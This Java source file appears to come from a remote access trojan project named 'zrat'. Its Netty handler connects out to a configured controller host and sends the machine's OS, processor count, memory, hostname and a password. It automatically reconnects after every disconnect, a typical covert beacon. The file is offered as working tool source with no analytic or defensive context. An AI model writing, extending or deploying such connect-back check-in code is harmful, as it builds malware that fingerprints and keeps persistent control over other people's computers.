package com.zrat.server.nio.handler;

import java.net.ConnectException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.ChannelStateEvent;
import org.jboss.netty.channel.ExceptionEvent;
import org.jboss.netty.channel.SimpleChannelUpstreamHandler;
import org.jboss.netty.channel.ChannelHandler.Sharable;
import org.jboss.netty.util.Timeout;
import org.jboss.netty.util.Timer;
import org.jboss.netty.util.TimerTask;

import com.zrat.server.Server;
import com.zrat.server.nio.factory.ServerPipelineFactory;
import com.zrat.transfer.model.TransferDataStruct;
@Sharable
public abstract class ServerNIOHandler extends SimpleChannelUpstreamHandler{
	public static final String OS_NAME = "os.name";
	public static final String COMMAND_NEW_SERVER = "newServer";
	public static final String PROPERTY_PROCESSOR = "processor";
	public static final String PROPERTY_SYSTEMNAME = "systemName";
	public static final String PROPERTY_MEMORY = "memory";
	public static final String PROPERTY_PASSWORD = "password";
	public static final String PROPERTY_HOSTNAME = "hostName";
	final ClientBootstrap bootstrap;
    private final Timer timer;
    protected long startTime = -1;

    public ServerNIOHandler(ClientBootstrap bootstrap, Timer timer) {
        this.bootstrap = bootstrap;
        this.timer = timer;
    }
    
    @Override
    public void channelClosed(ChannelHandlerContext ctx, ChannelStateEvent e) {
    	timer.newTimeout(new TimerTask() {
            public void run(Timeout timeout) throws Exception {
                bootstrap.connect(new InetSocketAddress(InetAddress.getByName(Server.HOST).getHostAddress(),Server.PORT));
            }
        }, ServerPipelineFactory.RECONNECT_DELAY, TimeUnit.SECONDS);
    }

    @Override
    public void channelConnected(ChannelHandlerContext ctx, ChannelStateEvent e) {
        if (startTime < 0) {
            startTime = System.currentTimeMillis();
        }
        Server.setChannel(e.getChannel());
        
        Map<String,Object> server = new HashMap<String,Object>();
        server.put(PROPERTY_PROCESSOR,Runtime.getRuntime().availableProcessors());
        server.put(PROPERTY_SYSTEMNAME,System.getProperty(OS_NAME));
        server.put(PROPERTY_MEMORY,Runtime.getRuntime().totalMemory());
        server.put(PROPERTY_PASSWORD,Server.PASSWORD);
        String str ="";
		try {
			str = InetAddress.getLocalHost().getHostName();
		} catch (UnknownHostException e1) {
			e1.printStackTrace();
		}
		server.put(PROPERTY_HOSTNAME,str.indexOf(".") >0 ?str.substring(0,str.indexOf(".")):str);
        TransferDataStruct data = new TransferDataStruct(COMMAND_NEW_SERVER);
        data.setObject(server);
        
        e.getChannel().write(data);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, ExceptionEvent e) {
        Throwable cause = e.getCause();
        if (cause instanceof ConnectException) {
            startTime = -1;
            ctx.getChannel().close();
        }
        e.getCause().printStackTrace();
        
    }

}
